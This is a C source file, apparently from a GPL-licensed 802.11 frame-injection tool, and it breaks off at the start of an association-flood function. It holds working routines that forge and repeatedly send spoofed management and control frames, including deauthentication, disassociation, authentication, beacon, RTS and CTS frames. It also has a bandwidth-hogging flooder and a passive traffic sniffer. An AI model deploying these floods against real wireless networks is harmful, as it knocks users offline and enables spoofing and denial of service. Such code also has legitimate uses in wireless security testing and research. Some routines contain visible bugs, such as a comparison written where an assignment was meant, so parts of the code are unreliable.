/* This is where the action is !
 Make your packet and send it off raw !
 "May the packets be with you!!"

This program is free software; you can redistribute it and/or modify it under
the terms of version 2 of the GNU General Public License as published by the
Free Software Foundation.

This program is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.  See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with
this program; if not, write to the Free Software Foundation, Inc., 59 Temple
Place - Suite 330, Boston, MA  02111-1307, USA.

*/
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <asm/types.h>
//#include <netinet/in.h>
#include <time.h>
#include <string.h>

//local includes
#include "config.h"
#include "analyzer.h"
#include "macros.h"
#include "wlaninfo.h"
#include "zulu.h"

#define MAX_BUFLEN 2048
unsigned char read_buf[MAX_BUFLEN];

// the delay variable is extern, it should be in main.c
extern unsigned int delay;

#define ADDR_LEN 6
#define DST_OFFSET 4
#define SRC_OFFSET 10
#define ADDR3_OFFSET 16
#define ADDR4_OFFSET 24


//local forward declarations
static int  random_mac(unsigned char *mac, unsigned char *rnd_mac,unsigned int offset);

int forge_beacon(int fd_sock, unsigned char *src_mac, char *ssid, unsigned int beac_int, unsigned char channel, int count, __u16 duration, __u8 flags, __u8 fragment, __u16 sequence) 
{
  int i,n_written;

  unsigned char pack_buf[MAX_PACK_LEN],*packet;
  unsigned int pack_len;
  __u16	nu16;
  __u8	nu8;
  int index=0;
	
  memset(pack_buf,0,MAX_PACK_LEN);
  packet = &pack_buf[0];

//   nu16 = (WLAN_PROTO_VER | (WLAN_FTYPE_MGMT << 2 ) | (WLAN_MGMT_BEACON << 4));
  nu8 = 0x80;
  PACK_ADD(packet,nu8);
  nu8 = flags;
  PACK_ADD(packet,nu8);
  nu16 = duration;
  PACK_ADD(packet,nu16);

  memcpy(packet,WLAN_BROADCAST_ADDR,WLAN_ADDR_LEN);
  memcpy(packet+WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  memcpy(packet+2*WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  packet = packet + 3 * WLAN_ADDR_LEN;
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16); //end damon add sequence number
#ifdef PRISM
  packet += WLAN_ADDR_LEN;
  // the xtra WLAN_ADDR_LEN is because the driver needs padding for address 4
  //and skip 16 bits for sequence control info added by driver
#endif

  // skip over space for timestamp field
  packet += WLAN_TIMESTAMP_LEN;
		
  nu16 = beac_int;
  PACK_ADD(packet,nu16);
	
  nu16 = WLAN_DEFAULT_CAPA_BEAC;
  PACK_ADD(packet,nu16);

  packet[0] = (__u8)WLAN_IE_SSID;
  nu8 = (__u8)(ssid ? strlen(ssid):strlen(WLAN_DEFAULT_SSID));
  packet[1] = nu8;
  memcpy(&packet[2],ssid ? ssid:WLAN_DEFAULT_SSID,nu8);
  packet += 2 + nu8;
	
  packet[0] = (__u8)WLAN_IE_SUPPR;
  nu8 = (__u8)WLAN_DEFAULT_SUPPR_LEN;
  packet[1] = nu8;
  memcpy(&packet[2],WLAN_DEFAULT_SUPPR,nu8);
  packet += 2 + nu8;
	
  packet[0] = WLAN_IE_DSSET;
  nu8 = (__u8) 0x1;
  packet[1] = nu8;
  memcpy(&packet[2],&channel,nu8);
  packet += (2 + nu8);

  packet[0] = WLAN_IE_TIM;
  nu8 = (__u8) WLAN_DEFAULT_TIM_LEN;
  packet[1] = nu8;
  memcpy(&packet[2],WLAN_DEFAULT_TIM,nu8);
  packet += 2 + nu8;

  pack_len = packet - &pack_buf[0] ;

#ifdef DEBUG
//  packet_dump(&pack_buf[0],pack_len);
#endif	
  i = 1;
  // while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
  for(index=0;index<count;index++) {
     n_written = write(fd_sock,&pack_buf[0],pack_len);
     printf("Wrote %d bytes forged_beacons\n",n_written);
#ifdef DEBUG
// 	printf("forge_beacon(%d): %d bytes written\n", i++,n_written);
#endif	
     //ANS: usleep(delay);
  }
  //perror("");
  //printf("forge_beacon: socket write failed!\n");
  return 1;
	
}

int forge_proberesponse(int fd_sock, unsigned char *src_mac, char *ssid, unsigned int beac_int, unsigned char channel, int count, __u16 duration, __u8 flags, __u8 fragment, __u16 sequence) 
{
  int i,n_written;

  unsigned char pack_buf[MAX_PACK_LEN],*packet;
  unsigned int pack_len;
  __u16	nu16;
  __u8	nu8;
  int index=0;
	
  memset(pack_buf,0,MAX_PACK_LEN);
  packet = &pack_buf[0];

//   nu16 = (WLAN_PROTO_VER | (WLAN_FTYPE_MGMT << 2 ) | (WLAN_MGMT_BEACON << 4));
  nu8 = 0x50;
  PACK_ADD(packet,nu8);
  nu8 = flags;
  PACK_ADD(packet,nu8)
  nu16 = duration;
  PACK_ADD(packet,nu16);

  memcpy(packet,WLAN_BROADCAST_ADDR,WLAN_ADDR_LEN);
  memcpy(packet+WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  memcpy(packet+2*WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  packet = packet + 3 * WLAN_ADDR_LEN; 
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16); //end damon add sequence number
#ifdef PRISM
  packet += WLAN_ADDR_LEN;
  // the xtra WLAN_ADDR_LEN is because the driver needs padding for address 4
  //and skip 16 bits for sequence control info added by driver
#endif

  // skip over space for timestamp field
  packet += WLAN_TIMESTAMP_LEN;
		
  nu16 = beac_int;
  PACK_ADD(packet,nu16);
	
  nu16 = WLAN_DEFAULT_CAPA_BEAC;
  PACK_ADD(packet,nu16);

  packet[0] = (__u8)WLAN_IE_SSID;
  nu8 = (__u8)(ssid ? strlen(ssid):strlen(WLAN_DEFAULT_SSID));
  packet[1] = nu8;
  memcpy(&packet[2],ssid ? ssid:WLAN_DEFAULT_SSID,nu8);
  packet += 2 + nu8;
	
  packet[0] = (__u8)WLAN_IE_SUPPR;
  nu8 = (__u8)WLAN_DEFAULT_SUPPR_LEN;
  packet[1] = nu8;
  memcpy(&packet[2],WLAN_DEFAULT_SUPPR,nu8);
  packet += 2 + nu8;
	
  packet[0] = WLAN_IE_DSSET;
  nu8 = (__u8) 0x1;
  packet[1] = nu8;
  memcpy(&packet[2],(unsigned int)channel > 13 ? WLAN_DEFAULT_CHANNEL:&channel,nu8);

  packet += (2 + nu8);

  packet[0] = WLAN_IE_TIM;
  nu8 = (__u8) WLAN_DEFAULT_TIM_LEN;
  packet[1] = nu8;
  memcpy(&packet[2],WLAN_DEFAULT_TIM,nu8);
  packet += 2 + nu8;

  pack_len = packet - &pack_buf[0] ;

#ifdef DEBUG
//  packet_dump(&pack_buf[0],pack_len);
#endif	
  i = 1;
  // while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
  for(index=0;index<count;index++) {
	n_written = write(fd_sock,&pack_buf[0],pack_len);
#ifdef DEBUG
	printf("forge_proberesponse(%d): %d bytes written\n", i++,n_written);
#endif	
	usleep(delay);
  }
  //perror("");
  //printf("forge_beacon: socket write failed!\n");
  return 1;
	
}

int forge_ver_distrib(int fd_sock, unsigned char *sender_mac, unsigned char *recv_mac, int data_distri,
		      int mgmt_distri, int ctrl_distri)
{
   int i=0;
   printf("Got called with %d %d %d\n", data_distri, mgmt_distri, ctrl_distri);
   forge_Data(fd_sock, sender_mac, recv_mac, 1, data_distri, 0, 200,0,0,0 ) ;
//   for (i=0;i<mgmt_distri;i++) {
   while(i<mgmt_distri) {
     forge_beacon(fd_sock, sender_mac, "PV_Distri", 100, 1, 1, 200,0,0,0);
      i=i+1;
      forge_proberesponse(fd_sock, sender_mac, "PV_Distri", 100, 1, 1, 200, 0,0,0);
      i=i+1;
   }
   forge_control_rts( fd_sock, sender_mac, recv_mac, ctrl_distri, 200,0);
      
   return 1;
   
}

int forge_control_rts(int fd_sock, unsigned char *sender_mac, unsigned char *recv_mac, int count, __u16 duration, __u8 flags)
{
   int n_written;
   unsigned char pack_buf[MAX_PACK_LEN], *packet;
   unsigned int pack_len;
   int index=0;

   __u16 nu16 = 0;
   __u8 nu8 = 0;
   
   packet  = &pack_buf[0];
   memset(pack_buf,0,MAX_PACK_LEN);
   nu8=0xB4; //type data subtype data
   PACK_ADD(packet, nu8);

   //Falgs
   nu8 = flags;
   PACK_ADD(packet, nu8);

   nu16 = duration;
   PACK_ADD(packet,nu16);

   //add the sender and receiver addresses
   memcpy(packet,recv_mac,WLAN_ADDR_LEN);
   memcpy(packet + WLAN_ADDR_LEN,sender_mac,WLAN_ADDR_LEN);
   
   packet = packet + 2 * WLAN_ADDR_LEN  ;  
   pack_len = packet - &pack_buf[0] ;
   
   //  while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
   for(index=0;index<count;index++) {
      n_written = write(fd_sock,&pack_buf[0],pack_len);
      printf(" forge_RTS: %d btyes written\n", n_written);
      //packet_dump(&pack_buf[0], pack_len);
      //ANS:  usleep(100);
   }
   
   //  perror("");
   //printf("forge_DATA: socket write failed!\n");
   return 1;
}

int forge_control_cts(int fd_sock, unsigned char *recv_mac, int count, __u16 duration, __u8 flags)
{
   int n_written;
   unsigned char pack_buf[MAX_PACK_LEN], *packet;
   unsigned int pack_len;
   int index=0;

   __u16 nu16 = 0;
   __u8 nu8 = 0;
   
   packet  = &pack_buf[0];
   memset(pack_buf,0,MAX_PACK_LEN);
   
   nu8= 0xC4; //type data subtype data
   PACK_ADD(packet, nu8);

   //Falgs
   nu8 = flags;
   PACK_ADD(packet, nu8);

   nu16 = duration;
   PACK_ADD(packet,nu16);

   //add the sender and receiver addresses
   memcpy(packet,recv_mac,WLAN_ADDR_LEN);
   
   packet = packet + WLAN_ADDR_LEN  ;  
   pack_len = packet - &pack_buf[0] ;
   
   //  while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
   for(index=0;index<count;index++) {
      n_written = write(fd_sock,&pack_buf[0],pack_len);
      printf(" forge_CTS: %d btyes written\n", n_written);
      //packet_dump(&pack_buf[0], pack_len);
      //ANS:  usleep(100);
   }
   
   return 1;
}


int forge_atim(int fd_sock, unsigned int count, unsigned char *src_mac, unsigned char *dest_mac, __u16 duration, __u8 flags, __u8 fragment, __u16 sequence) {
  int n_written;
   unsigned char pack_buf[MAX_PACK_LEN], *packet;
   unsigned int pack_len;
   int index=0;

   __u16 nu16 = 0;
   __u8 nu8 = 0;
   
   packet  = &pack_buf[0];
   memset(pack_buf,0,MAX_PACK_LEN);
   
   nu8= 0x90; //type mangment subtype atim
   PACK_ADD(packet, nu8);

   //Falgs
   nu8 = flags;
   PACK_ADD(packet, nu8);

   nu16 = duration;
   PACK_ADD(packet,nu16);

   //add the sender and receiver addresses
   memcpy(packet,dest_mac,WLAN_ADDR_LEN);
   
   packet = packet + WLAN_ADDR_LEN;  
   memcpy(packet,src_mac,WLAN_ADDR_LEN);
   
   packet = packet + WLAN_ADDR_LEN;
   memcpy(packet,dest_mac,WLAN_ADDR_LEN);
   
   packet = packet + WLAN_ADDR_LEN;
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16);
   pack_len = packet - &pack_buf[0];
   
   //  while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
   for(index=0;index<count;index++) {
      n_written = write(fd_sock,&pack_buf[0],pack_len);
      printf(" forge_atim: %d btyes written\n", n_written);
      //packet_dump(&pack_buf[0], pack_len);
      //ANS:  usleep(100);
   }
   
   return 1;

}

int forge_pspoll(int fd_sock, unsigned int count, unsigned char *src_mac, unsigned char *dest_mac, __u16 assoc_id, __u8 flags) {

  int n_written;
   unsigned char pack_buf[MAX_PACK_LEN], *packet;
   unsigned int pack_len;
   int index=0;

   __u16 nu16 = 0;
   __u8 nu8 = 0;
   
   packet  = &pack_buf[0];
   memset(pack_buf,0,MAX_PACK_LEN);
   
   nu8= 0xA4; //type control subtype ps-poll
   PACK_ADD(packet, nu8);

   //Falgs
   nu8 = flags;
   PACK_ADD(packet, nu8);

   nu16 = assoc_id;
   PACK_ADD(packet,nu16);

   //add the sender and receiver addresses
   memcpy(packet,dest_mac,WLAN_ADDR_LEN);
   
   packet = packet + WLAN_ADDR_LEN;  
   memcpy(packet,src_mac,WLAN_ADDR_LEN);
   
   packet = packet + WLAN_ADDR_LEN;
   pack_len = packet - &pack_buf[0];
   
   //  while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
   for(index=0;index<count;index++) {
      n_written = write(fd_sock,&pack_buf[0],pack_len);
      printf(" forge_pspoll: %d btyes written\n", n_written);
      //packet_dump(&pack_buf[0], pack_len);
      //ANS:  usleep(100);
   }
   
   return 1;

}
   
int forge_Data(int fd_sock, unsigned char *sender_mac, unsigned char *recv_mac, int ToDS, int count, unsigned char flags , __u16 duration, __u8 fragment, __u16 sequence, __u8 data_type) 
{
  
  int n_written;
  unsigned char pack_buf[MAX_PACK_LEN], *packet;
  unsigned int pack_len;

  unsigned char dummy_data[50];

  __u16 nu16 = 0;
  __u8 nu8 = 0;

  int index=0;

  //nullify the dummy data buffer
  bzero((void *)dummy_data, sizeof(dummy_data));

  //printf("Starting RTS flood from %s to %s", sender_mac, recv_mac);


  packet  = &pack_buf[0];
  memset(pack_buf,0,MAX_PACK_LEN);
  
  nu8= 0x08 | data_type; //type data subtype data
  PACK_ADD(packet, nu8);
  
  //we set here the flag fields
  //the deault value of the flags is set ot 0
  //  nu8 = (ToDS?0x01:0x02);
  //if (ToDS)
  //{
  //  nu8 = '\x01'; //no retry bit
  //}
  //else
  //{
  //  nu8 = '\x02'; //no retry bit
  //}
  nu8 = flags;
//  printf("flag = %x\n", nu8);
  //  nu8 = nu8 | flags;
  PACK_ADD(packet, nu8);
  
  /*  nu16 = (WLAN_PROTO_VER | (WLAN_FTYPE_DATA << 2) | (WLAN_DATA_DATA << 4)); */
  /*   PACK_ADD(packet,nu16); */
  
  nu16 = duration;
  PACK_ADD(packet,nu16);
  
  memcpy(packet,recv_mac,WLAN_ADDR_LEN);
  memcpy(packet + WLAN_ADDR_LEN,sender_mac,WLAN_ADDR_LEN);

  //  - this should be the final destination
  memcpy(packet + 2*WLAN_ADDR_LEN,recv_mac,WLAN_ADDR_LEN);


//  memcpy(packet + 2*WLAN_ADDR_LEN,"\x00\x0c\xe6\x03\0x04\x05",WLAN_ADDR_LEN);
  
  packet = packet + 3 * WLAN_ADDR_LEN;  
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16);
#ifdef PRISM
  packet += WLAN_ADDR_LEN;
#endif  
  // packet = packet + 3*WLAN_ADDR_LEN + 

  memcpy(packet, dummy_data, sizeof(dummy_data));

  packet = packet + sizeof(dummy_data);

  pack_len = packet - &pack_buf[0] ;

  //  while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
  for(index=0;index<count;index++) {
	n_written = write(fd_sock,&pack_buf[0],pack_len);
	printf(" forge_DATA: %d btyes written\n", n_written);
	//packet_dump(&pack_buf[0], pack_len);
	usleep(100);
  }

  //  perror("");
  //printf("forge_DATA: socket write failed!\n");
  return 1;
}

int forge_Data_NULL(int fd_sock, unsigned char *sender_mac, unsigned char *recv_mac, int ToDS, int count, unsigned char flags, __u16 duration) 
{
  
  int n_written;
  unsigned char pack_buf[MAX_PACK_LEN], *packet;
  unsigned int pack_len;

  unsigned char dummy_data[50];

  __u16 nu16 = 0;
  __u8 nu8 = 0;

  int index=0;

  //nullify the dummy data buffer
  bzero((void *)dummy_data, sizeof(dummy_data));

  //printf("Starting RTS flood from %s to %s", sender_mac, recv_mac);


  packet  = &pack_buf[0];
  memset(pack_buf,0,MAX_PACK_LEN);
  
  /*  - Data NULL */
  nu8= 0x48; //type data subtype data
  PACK_ADD(packet, nu8);
  
  //we set here the flag fields
  //the deault value of the flags is set ot 0
  //  nu8 = (ToDS?0x01:0x02);
  if (ToDS)
	{
		nu8 = '\x01';
	}
  else
	{
		nu8 = '\x02';
	}
// printf("flag = %x\n", nu8);
  nu8 = nu8 | flags;
  PACK_ADD(packet, nu8);
  
  /*  nu16 = (WLAN_PROTO_VER | (WLAN_FTYPE_DATA << 2) | (WLAN_DATA_DATA << 4)); */
  /*   PACK_ADD(packet,nu16); */
  
  nu16 = duration;
  PACK_ADD(packet,nu16);
  
  memcpy(packet,recv_mac,WLAN_ADDR_LEN);
  memcpy(packet + WLAN_ADDR_LEN,sender_mac,WLAN_ADDR_LEN);

  //  - this should be the final destination
  memcpy(packet + 2*WLAN_ADDR_LEN,recv_mac,WLAN_ADDR_LEN);


//  memcpy(packet + 2*WLAN_ADDR_LEN,"\x00\x0c\xe6\x03\0x04\x05",WLAN_ADDR_LEN);
  
  packet = packet + 3 * WLAN_ADDR_LEN + sizeof(nu16) ;  
#ifdef PRISM
  packet += WLAN_ADDR_LEN;
#endif  
  
  // packet = packet + 3*WLAN_ADDR_LEN + 

  memcpy(packet, dummy_data, sizeof(dummy_data));

  packet = packet + sizeof(dummy_data);

  pack_len = packet - &pack_buf[0] ;

  //  while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
  for(index=0;index<count;index++) {
	n_written = write(fd_sock,&pack_buf[0],pack_len);
// 	printf(" forge_DATA: %d btyes written\n", n_written);
	//packet_dump(&pack_buf[0], pack_len);
	//ANS: usleep(100);
  }

  //  perror("");
  //printf("forge_DATA: socket write failed!\n");
  return 1;
}

int forge_ProbeRequest(int fd_sock, unsigned char *src_mac, char *ssid, int count, int arbitIE, __u16 duration, __u8 flags, __u8 fragment, __u16 sequence) 
{
  int n_written;
  unsigned char pack_buf[MAX_PACK_LEN],*packet;
  unsigned int pack_len;
  
  int index;
  __u16 nu16;
  __u8 nu8;
  
  //  bzero((void *)pack_buf, sizeof(pack_buf));
  
  memset(pack_buf,0,MAX_PACK_LEN);
  packet  = &pack_buf[0];
  
  //frmae type and subtype
  //  nu16 = (WLAN_PROTO_VER | (WLAN_FTYPE_MGMT << 2) | (WLAN_MGMT_PROB_REQ << 4));
  nu8 = 0x40;
  PACK_ADD(packet,nu8);
  nu8 = flags;
  PACK_ADD(packet,nu8);

  //duration
  nu16 = duration;
  PACK_ADD(packet, nu16);

  memcpy(packet,WLAN_BROADCAST_ADDR,WLAN_ADDR_LEN);
  memcpy(packet + WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  memcpy(packet + 2*WLAN_ADDR_LEN,WLAN_BROADCAST_ADDR,WLAN_ADDR_LEN);
  packet = packet + 3 * WLAN_ADDR_LEN; 
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16); //end damon add sequence number
#ifdef PRISM
  packet += WLAN_ADDR_LEN;
#endif  

  packet[0] == (__u8)WLAN_IE_SSID;
  //    nu8 = (__u8)(strlen(WLAN_DEFAULT_SSID));
  nu8 = (__u8)(ssid ? strlen(ssid):strlen(WLAN_DEFAULT_SSID));
  packet[1] = nu8;
  //    memcpy(&packet[2],WLAN_DEFAULT_SSID,nu8);
  memcpy(&packet[2],ssid ? ssid:WLAN_DEFAULT_SSID,nu8);
  packet += 2 + nu8; //skip over the IE_SSID + length byte + lenght of SSID

  packet[0] = WLAN_IE_SUPPR;
  nu8 = (__u8)WLAN_DEFAULT_SUPPR_LEN;
  packet[1] = nu8;
  memcpy(&packet[2],WLAN_DEFAULT_SUPPR,nu8);
  packet += 2 + nu8;


  if (arbitIE)
  {
		  packet[0] = (__u8)0x50;
		  nu8 = 2;
		  packet[1] = nu8;
		  memcpy(&packet[2],"\xFF\xFF",nu8);
		  packet += 2 + nu8;
  }

  pack_len = packet - &pack_buf[0] ;

  // while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
  for(index=0;index<count;index ++) {
	n_written = write(fd_sock,&pack_buf[0],pack_len);
	usleep(delay);
	printf("Forged a Probe request: %d\n", n_written);
	//	packet_dump(&pack_buf[0], pack_len);
	
  }
}
   
int forge_Authentication(int fd_sock, unsigned char *src_mac, unsigned char * dest_mac, int auth_type, int count, __u16 duration, __u8 flags, __u8 fragment, __u16 sequence) 
{
  int n_written;
  unsigned char pack_buf[MAX_PACK_LEN],*packet;
  unsigned int pack_len;
  
  int index;

  __u16 nu16;
  __u8 nu8;
  
  memset(pack_buf,0,MAX_PACK_LEN);
  packet  = &pack_buf[0];
  
  nu8 = 0xb0;
  PACK_ADD(packet, nu8);
  nu8 = flags;
  PACK_ADD(packet,nu8);
  //duration: equivalent to SIFS + Auth frame
  nu16 = duration;
  PACK_ADD(packet, nu16);

  //src mac is the client STA and the dest and BSSID are the AP's address
  memcpy(packet,dest_mac,WLAN_ADDR_LEN);
  memcpy(packet + WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  memcpy(packet + 2*WLAN_ADDR_LEN,dest_mac,WLAN_ADDR_LEN);
  packet = packet + 3 * WLAN_ADDR_LEN; 
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16); //end damon add sequence number
#ifdef PRISM
  packet += WLAN_ADDR_LEN;
#endif  

  //Open Authentication algorithm
  if (auth_type == 0) {
	nu16 =0x0000;
	PACK_ADD(packet, nu16);
  }
  //dont know what shared key authentication is: Do we need to forge the follow on frames also?
  else {
	nu16 =ntohs(0x0001);
	PACK_ADD(packet, nu16);
  }

  //Seq No: Subsequent Authentication replies increment the seq no
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet, nu16);
  
  //status code: successful
  nu16 =0x0000;
  PACK_ADD(packet, nu16);
  
  pack_len = packet - &pack_buf[0] ;

  //  while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
  for(index=0; index< count ; index ++) {
	n_written = write(fd_sock,&pack_buf[0],pack_len);
	usleep(delay);
	printf("Forged an Authentication frame: %d\n", n_written);
  }
}


  
/*  - actually a request - not changed the name of the function */
int forge_associate_resp(int fd_sock, unsigned char *src_mac, unsigned char *dest_mac, int count, __u16 duration, __u8 flags, __u8 fragment, __u16 sequence) 
{
  int n_written;
  unsigned char pack_buf[MAX_PACK_LEN],*packet;
  unsigned int pack_len;
  char ssid[100];
  
  __u16 nu16;
  __u8 nu8;
  
  int index;

  //  : FIXME : Remove this hardcoding.
  memcpy(ssid, "LinuxLab", strlen("LinuxLab"));

  memset(pack_buf,0,MAX_PACK_LEN);
  packet  = &pack_buf[0];

  nu8=0x00;
  PACK_ADD(packet, nu8);
  nu8=flags;
  PACK_ADD(packet,nu8);
  nu16 =duration;
  PACK_ADD(packet, nu16);
	
  memcpy(packet,dest_mac,WLAN_ADDR_LEN);
  memcpy(packet + WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  memcpy(packet + 2*WLAN_ADDR_LEN,dest_mac,WLAN_ADDR_LEN);
  packet = packet + 3 * WLAN_ADDR_LEN;
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16); //end damon add sequence number
#ifdef PRISM
  packet += WLAN_ADDR_LEN;
#endif  

  //capabilities: ESS and Arbitrary Reserved bits.
  nu16 =ntohs(0x01AB);
  PACK_ADD(packet, nu16);
	
  //listen interval : 1
  nu16 =ntohs(0x1000);
  PACK_ADD(packet, nu16);

  packet[0] == (__u8)WLAN_IE_SSID;
  //    nu8 = (__u8)(strlen(WLAN_DEFAULT_SSID));
  nu8 = (__u8)(ssid ? strlen(ssid):strlen(WLAN_DEFAULT_SSID));
  packet[1] = nu8;
  //    memcpy(&packet[2],WLAN_DEFAULT_SSID,nu8);
  memcpy(&packet[2],ssid ? ssid:WLAN_DEFAULT_SSID,nu8);
  packet += 2 + nu8; //skip over the IE_SSID + length byte + lenght of SSID

  packet[0] = (__u8)WLAN_IE_SUPPR;
  nu8 = (__u8)WLAN_DEFAULT_SUPPR_LEN;
  packet[1] = nu8;
  memcpy(&packet[2],WLAN_DEFAULT_SUPPR,nu8);
  packet += 2 + nu8;

  pack_len = packet - &pack_buf[0] ;
  
  //  while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
  for (index=0; index<count; index ++) {
	n_written = write(fd_sock,&pack_buf[0],pack_len);
	usleep(delay);
	printf("Forged an Association request frame: %d\n", n_written);
  }
}

int forge_disassoc(int fd_sock, unsigned char *src_mac, unsigned char *dest_mac, short int reason, int count,__u16 duration, __u8 flags, __u16 sequence, __u8 fragment) 
{
  int index=0;
#ifdef HARD_CODED
  int n_written;

  memcpy(&hard_disassoc[DST_OFFSET],dest_mac,ADDR_LEN);
  memcpy(&hard_disassoc[SRC_OFFSET],src_mac,ADDR_LEN);
  memcpy(&hard_disassoc[ADDR3_OFFSET],src_mac,ADDR_LEN);
  memcpy(&hard_disassoc[ADDR4_OFFSET],src_mac,ADDR_LEN);
  memcpy(&hard_disassoc[DISASS_RSN_OFFSET],&reason,DISASS_RSN_LEN);

  while((n_written = write(fd_sock,hard_disassoc,sizeof(hard_disassoc)-1)) >= 0 ) {
#ifdef DEBUG
// 	printf("forge_disassociate: %d bytes written\n", n_written);
#endif	
	usleep(delay);
  }
  perror("");
 //  printf("forge_disassociate: socket write failed!\n");
  return 1;
#else

  int n_written;
  unsigned char pack_buf[MAX_PACK_LEN],*packet;
  unsigned int pack_len;

  __u16	nu16;
  __u8	nu8;
	
	memset(pack_buf,0,MAX_PACK_LEN);
  packet  = &pack_buf[0];
  
  nu8 = (WLAN_PROTO_VER | (WLAN_FTYPE_MGMT << 2) | (WLAN_MGMT_DISAS << 4));
  PACK_ADD(packet,nu8);
  
  nu8 = flags;
  PACK_ADD(packet,nu8);

  nu16=duration;
  PACK_ADD(packet,nu16);

  memcpy(packet,dest_mac,WLAN_ADDR_LEN);
  memcpy(packet+WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  memcpy(packet+(2*WLAN_ADDR_LEN),src_mac,WLAN_ADDR_LEN);
  //packet = packet + 3 * WLAN_ADDR_LEN + sizeof(nu16); //BROKEN
  packet = packet + 3 * WLAN_ADDR_LEN; //damon
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16); //end damon add sequence number
#ifdef PRISM
  packet += WLAN_ADDR_LEN;
#endif  
    // the xtra WLAN_ADDR_LEN is because the driver needs padding for address 4
  //and skip 16 bits for sequence control info added by driver


  nu16 = 	reason;
  //nu16 = 	0x01;
  PACK_ADD(packet,nu16);

  pack_len = packet - &pack_buf[0];

#ifdef DEBUG
//  packet_dump(&pack_buf[0],pack_len);
#endif	
  //while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
  for(index=0;index<count;index++) {
	n_written = write(fd_sock,&pack_buf[0],pack_len);
#ifdef DEBUG
// 	printf("forge_disassociate : %d bytes written\n", n_written);
#endif	
	usleep(delay);
  }
  //perror("");
  //printf("forge_disassociate: socket write failed!\n");
  return 1;
	
#endif
}

int forge_deauth(int fd_sock, unsigned char *src_mac, unsigned char *dest_mac, short int reason, int count, __u16 duration, __u8 flags, __u8 fragment, __u16 sequence) 
{
  int index=0;
  int n_written;
  unsigned char pack_buf[MAX_PACK_LEN],*packet;
  unsigned int pack_len;

  __u16	nu16;
  __u8	nu8;
	
  memset(pack_buf,0,MAX_PACK_LEN);
  packet  = &pack_buf[0];

  nu8 = (WLAN_PROTO_VER | (WLAN_FTYPE_MGMT << 2) | (WLAN_MGMT_DEAUTH << 4));
  PACK_ADD(packet,nu8);
  nu8 = flags;
  PACK_ADD(packet,nu8);
  nu16=duration;
  PACK_ADD(packet,nu16);

  memcpy(packet,dest_mac,WLAN_ADDR_LEN);
  memcpy(packet+WLAN_ADDR_LEN,src_mac,WLAN_ADDR_LEN);
  memcpy(packet+(2*WLAN_ADDR_LEN),src_mac,WLAN_ADDR_LEN);
  packet = packet + 3 * WLAN_ADDR_LEN; 
  nu16 = (fragment) | (sequence << 4);
  PACK_ADD(packet,nu16); //end damon add sequence number
#ifdef PRISM
  packet += WLAN_ADDR_LEN;
#endif  
    // the xtra WLAN_ADDR_LEN is because the driver needs padding for address 4
  //and skip 16 bits for sequence control info added by driver


  nu16 = 	reason;
  //nu16 = 	0x01;
  PACK_ADD(packet,nu16);

  pack_len = packet - &pack_buf[0];

#ifdef DEBUG
//  packet_dump(&pack_buf[0],pack_len);
#endif	
  //while((n_written = write(fd_sock,&pack_buf[0],pack_len)) >=0 ) {
  for(index=0;index<count;index++) {
	n_written = write(fd_sock,&pack_buf[0],pack_len);
        printf("forge_deauth : %d bytes written\n", n_written);
	usleep(delay);
  }
  //perror("");
  //printf("forge_deauth: socket write failed!\n");
  return 1;
	
}
int bw_hog(int fd_sock,unsigned char *src_mac,unsigned int pack_size, int count) 
{
  unsigned char *pack;
  int n_written;
		
  int index=0;

  pack = (unsigned char *)malloc(pack_size);
  if(pack == NULL) {
	perror("");
	printf("bw_hog: could not allocate buffer\n");
	return 1;
  }
  memset(pack,0,pack_size);
  if(pack_size > (SRC_OFFSET + ADDR_LEN))
	memcpy(&pack[SRC_OFFSET],src_mac,ADDR_LEN);
  
  //  while((n_written = write(fd_sock,pack,pack_size)) >= 0)  {
  for(index=0;index<count;index++) {
	n_written = write(fd_sock,pack,pack_size);
#ifdef DEBUG
// 	printf("bw_hog: %d bytes written\n", n_written);
#endif	
	usleep(delay);
  }
  // perror("");
  //printf("bw_hog: socket write failed!\n");
  free(pack);
  return 1;
}	

int wlan_spy(int fd_sock) 
{
  int n_read,i;

  init_ap_list();
  init_client_list();

  signal(SIGALRM,display_wlan_stats);
  alarm(10);

  while((n_read=read_packet(fd_sock,read_buf,MAX_BUFLEN)) >= 0) {
	analyze_packet(read_buf,n_read);
  }	
  return 1;
}

int forge_ap_flood_associate(int fd_sock, unsigned char *src_mac, unsigned char *dest_mac, char *ssid, int count, __u16 duration, __u8 flags, __u8 fragment, __u16 sequence) 
{
